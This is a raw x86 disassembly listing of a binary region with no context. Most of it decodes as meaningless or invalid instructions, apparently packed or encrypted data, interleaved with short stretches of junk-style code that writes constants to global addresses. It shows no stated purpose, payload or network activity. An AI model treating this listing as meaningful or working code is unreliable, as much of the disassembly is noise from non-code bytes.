  40d66c:	pop    ds
  40d66d:	fcomp  DWORD PTR [edi]
  40d66f:	dec    ebp
  40d670:	push   0xa1afba4
  40d675:	cmp    BYTE PTR [ecx],0x5a
  40d678:	jns    0x40d6e7
  40d67a:	daa    
  40d67b:	pop    eax
  40d67c:	xchg   ecx,eax
  40d67d:	stos   DWORD PTR es:[edi],eax
  40d67e:	xor    DWORD PTR [esi],esi
  40d680:	xor    eax,0xb117af36
  40d685:	mov    dh,0x4a
  40d687:	ins    DWORD PTR es:[edi],dx
  40d688:	inc    eax
  40d689:	mov    ah,0xe6
  40d68b:	out    dx,al
  40d68c:	loope  0x40d659
  40d68e:	push   ebp
  40d68f:	and    al,0x89
  40d691:	ret    0x64fb
  40d694:	aaa    
  40d695:	rcr    DWORD PTR [ebp+0x77b2bc7b],1
  40d69b:	jo     0x40d653
  40d69d:	mov    al,0xe3
  40d69f:	adc    eax,0x55da44d1
  40d6a4:	inc    ecx
  40d6a5:	fdiv   QWORD PTR [ebx+0x2410ff39]
  40d6ab:	xchg   edx,eax
  40d6ac:	ret    
  40d6ad:	imul   ebp,DWORD PTR [edi],0x6
  40d6b0:	adc    ebx,DWORD PTR [eax-0x1df49d67]
  40d6b6:	cli    
  40d6b7:	mov    cl,0xf7
  40d6b9:	mov    edi,0xd148e15e
  40d6be:	push   ebx
  40d6bf:	cmp    al,0xed
  40d6c1:	jne    0x40d740
  40d6c3:	sbb    BYTE PTR [edi],dl
  40d6c5:	retf   0x5145
  40d6c8:	loopne 0x40d662
  40d6ca:	ficomp DWORD PTR [edx+edi*2-0x2d]
  40d6ce:	jg     0x40d6b7
  40d6d0:	stos   DWORD PTR es:[edi],eax
  40d6d1:	cmp    bl,ch
  40d6d3:	pop    ebp
  40d6d4:	test   eax,0x40bbaab
  40d6d9:	loope  0x40d687
  40d6db:	or     DWORD PTR [ebx+ebx*8],ecx
  40d6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6df:	call   0x931d9677
  40d6e4:	jmp    0xdde3f9b5
  40d6e9:	mov    al,ds:0xa8844bca
  40d6ee:	jle    0x40d67b
  40d6f0:	xchg   eax,eax
  40d6f2:	push   es
  40d6f3:	aad    0x13
  40d6f5:	(bad)  
  40d6f6:	sub    eax,0x628d851f
  40d6fb:	popf   
  40d6fc:	push   edx
  40d6fd:	mov    al,ds:0xa43323c2
  40d702:	cmp    BYTE PTR [ecx+0x30da395e],ch
  40d708:	xor    DWORD PTR [eax+0x55],eax
  40d70b:	push   eax
  40d70c:	add    DWORD PTR [ecx-0x5b],esi
  40d70f:	add    ah,dl
  40d711:	cmp    al,0x9a
  40d713:	and    DWORD PTR [eax+0x4a668cad],0x5fefee8c
  40d71d:	enter  0x1150,0x2b
  40d721:	dec    eax
  40d722:	adc    eax,DWORD PTR [ebp+0x4]
  40d725:	xor    eax,0x8fbf79d5
  40d72a:	jge    0x40d733
  40d72c:	fcom   st(0)
  40d72e:	out    dx,eax
  40d72f:	retf   0xe10c
  40d732:	mov    ecx,0x6e8cf1d1
  40d737:	push   ss
  40d738:	push   0x22
  40d73a:	mov    ebx,0x975a82a8
  40d73f:	jge    0x40d739
  40d741:	pop    edi
  40d742:	push   es
  40d743:	pop    eax
  40d744:	sbb    eax,0x70ce4bce
  40d749:	call   DWORD PTR [ecx+edi*4]
  40d74c:	int    0x1f
  40d74e:	imul   edx,DWORD PTR [ebp+0x55e92cdb],0xc083e7aa
  40d758:	or     eax,eax
  40d75a:	outs   dx,BYTE PTR ds:[esi]
  40d75b:	int3   
  40d75c:	test   DWORD PTR [ecx],edi
  40d75e:	and    cl,BYTE PTR [esp+ecx*4-0x7c84754c]
  40d765:	aam    0xba
  40d767:	mov    al,ds:0x3eeed793
  40d76c:	jb     0x40d71f
  40d76e:	ins    BYTE PTR es:[edi],dx
  40d76f:	push   es
  40d770:	pop    ebp
  40d771:	nop
  40d772:	and    edx,esp
  40d774:	jmp    0x6265345b
  40d779:	xchg   esp,eax
  40d77a:	data16 sub BYTE PTR [esi+0x45ac1673],dl
  40d781:	nop
  40d782:	arpl   WORD PTR [ebp+0x55],bp
  40d785:	dec    eax
  40d786:	push   eax
  40d787:	cld    
  40d788:	in     eax,dx
  40d789:	or     eax,0xbfaeb8b3
  40d78e:	and    ecx,edi
  40d790:	test   BYTE PTR [edx],al
  40d792:	sti    
  40d793:	inc    esi
  40d794:	xor    ch,BYTE PTR [esi+edi*1+0x2b45379]
  40d79b:	mov    dl,0xbd
  40d79d:	(bad)  
  40d79e:	mov    eax,ds:0x1d108047
  40d7a3:	repz test DWORD PTR [edi-0x2e1b6060],edi
  40d7aa:	icebp  
  40d7ab:	ins    BYTE PTR es:[edi],dx
  40d7ac:	out    dx,eax
  40d7ad:	cwde   
  40d7ae:	xchg   edi,eax
  40d7af:	xor    edx,DWORD PTR [esi-0x27]
  40d7b2:	sbb    BYTE PTR [edx-0x5d],bl
  40d7b5:	outs   dx,BYTE PTR ds:[si]
  40d7b7:	or     BYTE PTR [edi-0x7ee562e8],bh
  40d7bd:	(bad)  
  40d7be:	cmp    al,0x3
  40d7c0:	add    BYTE PTR [eax],al
  40d7c2:	mov    DWORD PTR ds:0x42a7dd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7e5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi-0x14c51ba3]
  40d7eb:	clc    
  40d7ec:	or     al,0x59
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	inc    ebx
  40d7f6:	shl    DWORD PTR es:[esi-0x5a],cl
  40d7fa:	scas   eax,DWORD PTR es:[edi]
  40d7fb:	out    dx,eax
  40d7fc:	ror    DWORD PTR [edx-0x2c],0x19
  40d800:	test   cl,cl
  40d802:	das    
  40d803:	xlat   BYTE PTR ds:[ebx]
  40d804:	in     al,dx
  40d805:	cwde   
  40d806:	mov    eax,0x14f5e6f
  40d80b:	mov    ?,eax
  40d80d:	sub    cl,al
  40d80f:	jnp    0x40d81e
  40d811:	dec    esp
  40d812:	mov    ?,WORD PTR [ebp+edx*2+0x2c]
  40d816:	pushf  
  40d817:	hlt    
  40d818:	hlt    
  40d819:	lock mov edx,0x71f8397e
  40d81f:	bound  ebx,QWORD PTR cs:[edx+0x36]
  40d823:	cld    
  40d824:	mov    ?,WORD PTR [edx-0x49d07374]
  40d82a:	dec    esp
  40d82b:	frstor [eax-0x72]
  40d82e:	push   edi
  40d82f:	iret   
  40d830:	(bad)  
  40d831:	repnz test BYTE PTR [edi+0x66ac7cbf],0xc6
  40d839:	pop    ecx
  40d83a:	fisubr DWORD PTR [eax]
  40d83c:	jge    0x40d7bf
  40d83e:	pop    ebp
  40d83f:	data16 xor BYTE PTR [eax-0x6da47666],al
  40d846:	adc    edx,DWORD PTR [ecx+eiz*1+0xe]
  40d84a:	jp     0x40d849
  40d84c:	mov    edi,0x47b52901
  40d851:	mov    esp,0xda3b11f3
  40d856:	icebp  
  40d857:	mov    esi,0x3b72ac7b
  40d85c:	mov    bh,0xfb
  40d85e:	retf   
  40d85f:	test   eax,0xdd450377
  40d864:	or     ch,al
  40d866:	aas    
  40d867:	fsubr  DWORD PTR [ecx]
  40d869:	out    dx,al
  40d86a:	cmp    DWORD PTR [edi+0x5f],edi
  40d86d:	mov    esp,0x6cf2b437
  40d872:	outs   dx,DWORD PTR ds:[esi]
  40d873:	inc    edi
  40d874:	clc    
  40d875:	lock out 0xec,eax
  40d878:	dec    esp
  40d879:	ret    0xc4d1
  40d87c:	inc    ebx
  40d87d:	out    0xe9,eax
  40d87f:	sub    BYTE PTR [edi-0x6],dl
  40d882:	dec    ebx
  40d883:	xchg   edi,eax
  40d884:	xchg   DWORD PTR [esi],ecx
  40d886:	jl     0x40d8e8
  40d888:	out    0x4e,al
  40d88a:	scas   al,BYTE PTR es:[edi]
  40d88b:	pushf  
  40d88c:	lods   eax,DWORD PTR ds:[esi]
  40d88d:	es int3 
  40d88f:	push   edi
  40d890:	in     eax,0xee
  40d892:	lea    esp,[esi-0x24]
  40d895:	dec    edi
  40d896:	aas    
  40d897:	xchg   DWORD PTR [esi+0x34],ebp
  40d89a:	ins    BYTE PTR es:[edi],dx
  40d89b:	push   cs
  40d89c:	xchg   ebp,eax
  40d89d:	mov    ebx,0x1e06ef16
  40d8a2:	ja     0x40d848
  40d8a4:	inc    ebp
  40d8a5:	aam    0x67
  40d8a7:	inc    esi
  40d8a8:	test   BYTE PTR [ebp-0x54],cl
  40d8ab:	mov    bh,0x5e
  40d8ad:	rcr    DWORD PTR [ecx],0x6
  40d8b0:	mov    edx,0xcd867faa
  40d8b5:	jg     0x40d927
  40d8b7:	xchg   edx,eax
  40d8b8:	data16 mov al,0xe9
  40d8bb:	in     al,dx
  40d8bc:	mov    fs,WORD PTR [ebx+0x4a]
  40d8bf:	xchg   edi,eax
  40d8c0:	xchg   ebp,eax
  40d8c1:	lds    esp,FWORD PTR [edx]
  40d8c3:	cmp    bl,0x8f
  40d8c6:	jb     0x40d8f2
  40d8c8:	jp     0x40d93c
  40d8ca:	or     al,0x1f
  40d8cc:	enter  0x8f25,0x6a
  40d8d0:	push   ecx
  40d8d1:	cmp    eax,0x8c15a9d2
  40d8d6:	div    BYTE PTR [edx]
  40d8d8:	dec    esi
  40d8d9:	mov    edx,0x67edacc1
  40d8de:	test   BYTE PTR [eax-0x445b4316],ch
  40d8e4:	push   ecx
  40d8e5:	mov    esp,0x16485899
  40d8ea:	(bad)  
  40d8eb:	js     0x40d882
  40d8ed:	frstor [ecx]
  40d8ef:	mov    cl,0x4e
  40d8f1:	int    0x72
  40d8f3:	and    eax,0x86a1edff
  40d8f8:	in     al,dx
  40d8f9:	aad    0xbf
  40d8fb:	or     al,0x5d
  40d8fd:	ss test al,0x8c
  40d900:	push   ebp
  40d901:	inc    eax
  40d902:	imul   edx,DWORD PTR [edx+0x61],0x3b
  40d906:	loope  0x40d8c3
  40d908:	(bad)  
  40d909:	hlt    
  40d90a:	xor    BYTE PTR [eax-0x57],ah
  40d90d:	dec    esi
  40d90e:	jbe    0x40d956
  40d910:	adc    BYTE PTR [esi],0xe9
  40d913:	sub    BYTE PTR [ebp-0x439b4801],dh
  40d919:	rcl    BYTE PTR [edx+0x48a201c0],1
  40d91f:	sub    al,0x24
  40d921:	pusha  
  40d922:	fs daa 
  40d924:	push   esp
  40d925:	jp     0x40d8be
  40d927:	das    
  40d928:	(bad)  
  40d92a:	ja     0x40d96e
  40d92c:	pop    ebx
  40d92d:	in     al,dx
  40d92e:	test   BYTE PTR [ebp+eiz*2-0x332c0117],bl
  40d935:	sbb    DWORD PTR [ecx+eiz*4+0x6f3a0317],edi
  40d93c:	fs inc ebx
  40d93e:	sub    BYTE PTR [eax-0x16],bh
  40d941:	jne    0x40d910
  40d943:	xchg   esp,eax
  40d944:	sub    bh,al
  40d946:	clc    
  40d947:	shl    DWORD PTR [ebp+0x29e1bbfd],cl
  40d94d:	sub    esi,DWORD PTR [esi*8+0x121eedca]
  40d954:	pop    ebx
  40d955:	xchg   ebp,eax
  40d956:	dec    eax
  40d957:	(bad)  
  40d959:	or     BYTE PTR [ebx-0x2c],al
  40d95c:	push   es
  40d95d:	mov    al,ds:0xa611eaea
  40d962:	xchg   DWORD PTR [ebx-0x3fbfcbd9],ecx
  40d968:	push   es
  40d969:	lods   al,BYTE PTR ds:[esi]
  40d96a:	pushf  
  40d96b:	push   0x8f2f9ee2
  40d970:	sbb    BYTE PTR [edi],ah
  40d972:	jmp    0x40d9eb
  40d974:	xor    ah,BYTE PTR [esi+0x2c]
  40d977:	dec    ecx
  40d979:	test   eax,0x36a25228
  40d97e:	push   ss
  40d97f:	loop   0x40d971
  40d981:	(bad)  
  40d982:	repz retf 
  40d984:	dec    eax
  40d985:	adc    ch,0x39
  40d988:	stos   DWORD PTR es:[edi],eax
  40d989:	add    edx,edx
  40d98b:	cmc    
  40d98c:	mov    bh,0x5
  40d98e:	xchg   edi,eax
  40d98f:	outs   dx,BYTE PTR ds:[esi]
  40d990:	inc    edi
  40d991:	les    edi,FWORD PTR [ebx]
  40d993:	xor    BYTE PTR [eax-0x4730439a],ah
  40d999:	mov    dh,0x1c
  40d99b:	pusha  
  40d99c:	call   0x6393:0x1ed47301
  40d9a3:	pop    edi
  40d9a4:	lds    edi,FWORD PTR [eax+0x77a85824]
  40d9aa:	dec    edi
  40d9ab:	int    0x63
  40d9ad:	mov    bl,0xd8
  40d9af:	cdq    
  40d9b0:	loopne 0x40d9f2
  40d9b2:	xchg   esi,eax
  40d9b3:	cmp    eax,0x412cd1e0
  40d9b8:	mov    gs,WORD PTR [ecx]
  40d9ba:	icebp  
  40d9bb:	addr16 sub eax,0x3fd44d00
  40d9c1:	pop    ebx
  40d9c2:	sub    ebx,DWORD PTR [edx]
  40d9c4:	sahf   
  40d9c5:	ja     0x40d954
  40d9c7:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40d9c9:	push   0xffffffb9
  40d9cb:	in     eax,0xfa
  40d9cd:	jb     0x40da04
  40d9cf:	sbb    eax,0x90845658
  40d9d4:	xor    esp,eax
  40d9d6:	mov    dh,BYTE PTR [esi+0x51]
  40d9d9:	(bad)  
  40d9da:	fist   DWORD PTR [esi+0x405dd628]
  40d9e0:	pop    eax
  40d9e1:	into   
  40d9e2:	xor    al,0xaf
  40d9e4:	bound  edx,QWORD PTR [ebx+eax*1+0x71]
  40d9e8:	pop    esp
  40d9e9:	stos   DWORD PTR es:[edi],eax
  40d9ea:	xor    edx,0x37
  40d9ed:	jnp    0x40da6a
  40d9ef:	sub    DWORD PTR es:[eax+0x43077f30],ebx
  40d9f6:	jle    0x40da26
  40d9f8:	inc    ecx
  40d9f9:	arpl   WORD PTR [ecx+0x4d1c36d0],bp
  40d9ff:	div    DWORD PTR [edi+0x21adf654]
  40da05:	fst    QWORD PTR [ebx]
  40da07:	pop    edx
  40da08:	push   ecx
  40da09:	call   0x5bce7fd4
  40da0e:	bound  ebx,QWORD PTR [eax+0x2a4d1104]
  40da14:	jecxz  0x40da73
  40da16:	mov    BYTE PTR [ebx+0x3a],ah
  40da19:	sub    dl,BYTE PTR [ecx]
  40da1b:	lock lock fadd QWORD PTR [esi]
  40da1f:	sub    BYTE PTR es:[eax-0xdd98641],bh
  40da26:	cmp    DWORD PTR [ecx],esi
  40da28:	mov    esp,0xcc7db904
  40da2d:	xor    DWORD PTR ds:0x8658384,0x0
  40da34:	mov    eax,ds:0x42a851
  40da39:	sbb    eax,DWORD PTR ds:0x42a829
  40da3f:	mov    ds:0x42a851,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a811,0x42a7dd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a821,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a791,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	mov    ds:0x1617ab12,al
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0x7678787e
  40da8a:	or     BYTE PTR ds:0x4d90e782,bh
  40da90:	and    al,0xa3
  40da92:	pop    ds
  40da93:	loope  0x40da20
  40da95:	xor    esi,DWORD PTR [eax+0x6a6a887c]
  40da9b:	(bad)  
  40da9c:	out    0xfb,al
  40da9e:	push   edx
  40da9f:	mov    WORD PTR [ebx],gs
  40daa1:	xchg   edi,eax
  40daa2:	sub    ah,BYTE PTR [edi-0x514be37f]
  40daa8:	cwde   
  40daa9:	jge    0x40da62
  40daab:	and    bl,BYTE PTR [eax+0x65]
  40daae:	dec    edx
  40daaf:	mov    WORD PTR [ebx-0xb],cs
  40dab2:	test   ebx,edx
  40dab4:	repnz xchg esp,eax
  40dab6:	cmp    eax,0x1d477330
  40dabb:	iret   
  40dabc:	icebp  
  40dabd:	imul   ebp,DWORD PTR ds:0x30fde882,0xb5299397
  40dac7:	push   ecx
  40dac8:	cmp    eax,0x1adc4aec
  40dacd:	adc    al,al
  40dacf:	dec    edx
  40dad0:	sti    
  40dad1:	pop    ss
  40dad2:	and    eax,0x8e48836c
  40dad7:	fdivr  DWORD PTR fs:[di-0x4e]
  40dadc:	push   0xffffffaa
  40dade:	push   esp
  40dadf:	sahf   
  40dae0:	(bad)  
  40dae2:	icebp  
  40dae3:	loopne 0x40da7f
  40dae5:	adc    al,0x4
  40dae7:	loopne 0x40dabc
  40dae9:	dec    ecx
  40daea:	enter  0x62ec,0xa5
  40daee:	(bad)  
  40daef:	pop    ds
  40daf0:	arpl   WORD PTR [edx],cx
  40daf2:	repnz test BYTE PTR ds:0x232a2a81,ch
  40daf9:	push   ss
  40dafa:	pop    esi
  40dafb:	in     eax,0x59
  40dafd:	xchg   BYTE PTR [ecx],dh
  40daff:	out    dx,eax
  40db00:	and    DWORD PTR [edi-0x4315333c],edx
  40db06:	stos   BYTE PTR es:[edi],al
  40db07:	mov    ebp,gs
  40db09:	mov    al,ds:0x9bd683f6
  40db0e:	cmp    BYTE PTR [eax+ebx*8+0x40674f63],ah
  40db15:	je     0x40db4a
  40db17:	xchg   DWORD PTR [eax-0x2a],ebx
  40db1a:	ret    
  40db1b:	fcmovnu st,st(3)
  40db1d:	and    DWORD PTR [edx+eiz*2-0x1ff35738],ebp
  40db24:	aaa    
  40db25:	pop    es
  40db26:	sub    BYTE PTR ds:[ebp+0x4f],dh
  40db2a:	rcl    al,cl
  40db2c:	out    0xc6,al
  40db2e:	in     eax,dx
  40db2f:	push   ds
  40db30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db31:	out    0xd6,eax
  40db33:	imul   ebx,DWORD PTR [ebp-0x1e2ccb33],0xffffffd8
  40db3a:	addr16 mov al,0xe5
  40db3d:	mov    esp,0x29d85e59
  40db42:	aam    0xe1
  40db44:	push   ebp
  40db45:	ins    DWORD PTR es:[edi],dx
  40db46:	or     BYTE PTR [edx+0x6eea386e],ah
  40db4c:	outs   dx,DWORD PTR ds:[esi]
  40db4d:	push   0xffffffe4
  40db4f:	jecxz  0x40db7e
  40db51:	ins    DWORD PTR es:[edi],dx
  40db52:	mov    ch,0x4d
  40db54:	push   ebp
  40db55:	aaa    
  40db56:	rol    BYTE PTR [eax+0x74],cl
  40db59:	out    0x71,al
  40db5b:	sbb    BYTE PTR [edi-0x5c],dl
  40db5e:	jecxz  0x40db97
  40db60:	popf   
  40db61:	pop    eax
  40db62:	push   ebp
  40db63:	inc    ebp
  40db64:	in     eax,dx
  40db65:	push   ebp
  40db66:	data16 fld TBYTE PTR [edi-0x1a9e5f9a]
  40db6d:	jne    0x40dbec
  40db6f:	mov    bl,0x68
  40db71:	icebp  
  40db72:	rcr    DWORD PTR [edi],0xe0
  40db75:	inc    edx
  40db76:	mov    dh,ch
  40db78:	clc    
  40db79:	mov    esp,0xb41df9d9
  40db7e:	inc    edx
  40db7f:	mov    DWORD PTR ds:0x63d5f6bd,ebp
  40db85:	or     DWORD PTR [ebx-0x52],ebp
  40db88:	fwait
  40db89:	enter  0x9489,0xf9
  40db8d:	nop
  40db8e:	jae    0x40db8d
  40db90:	dec    DWORD PTR [edx]
  40db92:	cdq    
  40db93:	lea    ebp,[edx]
  40db95:	sbb    al,0x52
  40db97:	(bad)  
  40db98:	arpl   WORD PTR [edx-0x2c35a857],ax
  40db9e:	xchg   BYTE PTR [eax],dl
  40dba0:	cmp    esi,esi
  40dba2:	mov    ecx,0xc89e2192
  40dba7:	not    BYTE PTR [eax]
  40dba9:	bound  ecx,QWORD PTR [ebx+0xb]
  40dbac:	push   ebp
  40dbad:	sbb    eax,0x5ce8eeab
  40dbb2:	adc    al,0x0
  40dbb4:	mov    ds:0x78c0c336,eax
  40dbb9:	pusha  
  40dbba:	(bad)  
  40dbbb:	retf   
  40dbbc:	jge    0x40dbb8
  40dbbe:	fidivr WORD PTR [eax-0xe]
  40dbc1:	mov    ebp,0x1d5bba68
  40dbc6:	aad    0x49
  40dbc8:	sub    eax,0x1a991c49
  40dbcd:	push   eax
  40dbce:	adc    eax,DWORD PTR [edi+0x536d45d5]
  40dbd4:	adc    BYTE PTR [ecx-0x708532d3],bl
  40dbda:	inc    edx
  40dbdb:	mov    dh,BYTE PTR [ebp+0x29]
  40dbde:	sbb    al,BYTE PTR [ecx+0x519caab4]
  40dbe4:	mov    cl,0xd9
  40dbe6:	stos   BYTE PTR es:[edi],al
  40dbe7:	xchg   BYTE PTR [edi+0x74],cl
  40dbea:	(bad)  
  40dbeb:	cmp    al,0xac
  40dbed:	ins    DWORD PTR es:[edi],dx
  40dbee:	xchg   edx,eax
  40dbef:	mov    ds,edi
  40dbf1:	std    
  40dbf2:	sbb    DWORD PTR [eax],edi
  40dbf4:	shl    al,1
  40dbf6:	cmp    eax,0x3e7082dd
  40dbfb:	push   ebx
  40dbfc:	dec    ebx
  40dbfd:	pusha  
  40dbfe:	inc    ecx
  40dbff:	(bad)  
  40dc01:	mov    cl,0x6f
  40dc03:	fld    st(4)
  40dc05:	pop    ebx
  40dc06:	fwait
  40dc07:	xor    al,cl
  40dc09:	jns    0x40dc81
  40dc0b:	add    al,0x3e
  40dc0d:	pop    edx
  40dc0e:	iret   
  40dc0f:	fisttp WORD PTR [ebx-0x4a935615]
  40dc15:	fcmovnu st,st(4)
  40dc17:	mov    ah,0xdf
  40dc19:	test   al,0xcd
  40dc1b:	jb     0x40db9d
  40dc1d:	repnz mov bh,0x9a
  40dc20:	in     al,dx
  40dc21:	dec    edi
  40dc22:	cmp    bh,BYTE PTR [edi+esi*4+0x67fb6a7c]
  40dc29:	inc    ecx
  40dc2a:	xor    BYTE PTR [edi-0x3b166526],dl
  40dc30:	jg     0x40dca3
  40dc32:	lea    esp,[ebx+0x27ba9889]
  40dc38:	xchg   esi,eax
  40dc39:	and    al,BYTE PTR [edi-0x1f1c517]
  40dc3f:	dec    ecx
  40dc40:	test   DWORD PTR [esp+esi*8],esi
  40dc43:	dec    eax
  40dc44:	mov    ch,BYTE PTR gs:[edi+ebp*1+0x19]
  40dc49:	inc    ebp
  40dc4a:	mov    dl,BYTE PTR [edx*1-0x6f108d4e]
  40dc51:	mov    eax,ds:0xb9a67ee
  40dc56:	loop   0x40dc8b
  40dc58:	push   cs
  40dc59:	or     al,0x7d
  40dc5b:	pop    ss
  40dc5c:	jl     0x40dbe0
  40dc5e:	pop    ecx
  40dc5f:	sbb    BYTE PTR [ebx+0x4aec35d0],al
  40dc65:	or     DWORD PTR [esi],0x307a01ce
  40dc6b:	fldcw  WORD PTR [ebp+0x2a]
  40dc6e:	stos   DWORD PTR es:[edi],eax
  40dc6f:	div    BYTE PTR [eax]
  40dc71:	dec    ebp
  40dc72:	cmp    al,0x66
  40dc74:	aam    0xd3
  40dc76:	ja     0x40dc37
  40dc78:	into   
  40dc79:	adc    ah,bl
  40dc7b:	cwde   
  40dc7c:	xor    al,0x5d
  40dc7e:	mov    esi,DWORD PTR [ebx-0x19]
  40dc81:	std    
  40dc82:	mov    edi,0xe3a3585a
  40dc87:	mov    cl,0x4d
  40dc89:	sti    
  40dc8a:	add    BYTE PTR [ebx-0x3c],0x40
  40dc8e:	cmp    edx,ebp
  40dc90:	push   ds
  40dc91:	(bad)  
  40dc92:	in     eax,0x87
  40dc94:	popf   
  40dc95:	mov    esp,0x6f0491f2
  40dc9a:	lock xor BYTE PTR [ebp-0x47],0x30
  40dc9f:	addr16 (bad) 
  40dca1:	jle    0x40dce9
  40dca3:	out    dx,eax
  40dca4:	or     eax,0xe95bd60f
  40dca9:	les    esi,FWORD PTR [ecx-0x1ff46633]
  40dcaf:	xor    eax,0xb01dabd
  40dcb4:	test   al,0x5b
  40dcb6:	iret   
  40dcb7:	imul   edx
  40dcb9:	pop    esp
  40dcba:	(bad)  [eax+ebx*4]
  40dcbd:	cmp    eax,0x69efc64a
  40dcc2:	xchg   ecx,eax
  40dcc3:	fwait
  40dcc4:	add    eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a8a1,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a77d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7d5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a851,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a85d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7d9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7d1
  40dd3d:	and    DWORD PTR ds:0x42a7a1,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a891,0x42a89d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	sub    al,0xac
  40dd65:	inc    ebx
  40dd66:	shr    DWORD PTR cs:[eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40ddea
  40dd70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd71:	or     ch,bh
  40dd73:	adc    ah,BYTE PTR [edi-0x3b2d134d]
  40dd79:	(bad)  
  40dd7a:	and    bh,BYTE PTR [ebp-0x34]
  40dd7d:	add    edi,DWORD PTR [edi-0x56]
  40dd80:	xchg   DWORD PTR [esi-0x36],ebp
  40dd83:	rol    DWORD PTR [eax-0x790d7ba7],cl
  40dd89:	xchg   ebx,eax
  40dd8a:	xchg   edx,eax
  40dd8b:	stos   BYTE PTR es:[edi],al
  40dd8c:	adc    DWORD PTR [ebx],ecx
  40dd8e:	mov    al,ds:0x7e1594f1
  40dd93:	add    BYTE PTR [ebx+ebp*1+0x71],cl
  40dd97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd98:	mov    esi,0x915c6417
  40dd9d:	pop    edi
  40dd9e:	push   0x4daea9ed
  40dda3:	cli    
  40dda4:	and    eax,ebp
  40dda6:	mov    WORD PTR [esi-0x3d016999],cs
  40ddac:	int3   
  40ddad:	imul   edx,DWORD PTR [ebx+0x3],0x8bd404e6
  40ddb4:	adc    DWORD PTR [esp+ebx*4+0x52],eax
  40ddb8:	xor    ebp,DWORD PTR [ebp+0x9f8cd74]
  40ddbe:	test   dl,ch
  40ddc0:	inc    edi
  40ddc1:	xchg   edx,eax
  40ddc2:	inc    edi
  40ddc3:	xor    bh,BYTE PTR [edi]
  40ddc5:	in     al,dx
  40ddc6:	mov    ecx,0x6ddf813c
  40ddcb:	sar    ebp,cl
  40ddcd:	jmp    0x40dd62
  40ddcf:	mov    DWORD PTR [ebx+0x78520c18],ebx
  40ddd5:	jle    0x40dd9e
  40ddd7:	pop    edx
  40ddd8:	jmp    0xb44a:0x7de653f1
  40dddf:	mov    esp,0x9cb920e2
  40dde4:	popf   
  40dde5:	xchg   ebp,eax
  40dde6:	add    DWORD PTR ds:0x50bfec7b,0xb8157d3d
  40ddf0:	and    esp,DWORD PTR [esi]
  40ddf2:	std    
  40ddf3:	mov    esp,0x9c0a089a
  40ddf8:	mov    esi,0x3229d3b
  40ddfd:	mov    bh,0x59
  40ddff:	add    DWORD PTR [ebp-0x25b4cf2b],esi
  40de05:	inc    esp
  40de06:	mov    esp,eax
  40de08:	shl    DWORD PTR [edi-0x1d6fe73c],cl
  40de0e:	int3   
  40de0f:	cmp    eax,0xc007aa0f
  40de14:	and    bl,BYTE PTR [ebp-0x22c9c199]
  40de1a:	fdiv   QWORD PTR ds:0xfd46232b
  40de20:	sti    
  40de21:	fldenv [eax-0x7b]
  40de24:	out    dx,al
  40de25:	jle    0x40de79
  40de27:	shrd   ebp,eax,0x52
  40de2b:	test   BYTE PTR [ebp-0x7f],cl
  40de2e:	js     0x40de6b
  40de30:	pushf  
  40de31:	and    dh,BYTE PTR [ebx+ecx*1+0x44]
  40de35:	sbb    eax,0x576c00d5
  40de3a:	pop    ecx
  40de3b:	and    BYTE PTR [eax+esi*2+0x3bed39e1],bh
  40de42:	jl     0x40de23
  40de44:	out    dx,eax
  40de45:	mov    ds:0xa9ff423f,al
  40de4a:	sub    DWORD PTR [edx-0x2b91e80a],ebp
  40de50:	mov    bh,0xce
  40de52:	mov    DWORD PTR [ebx+0x47],eax
  40de55:	icebp  
  40de56:	sbb    ch,BYTE PTR [edi+0x5a]
  40de59:	test   DWORD PTR [ebx-0x1a],ebp
  40de5c:	fld    DWORD PTR [esi+edx*8-0x48]
  40de60:	jmp    0x40deae
  40de62:	jecxz  0x40de7e
  40de64:	mov    edx,ds
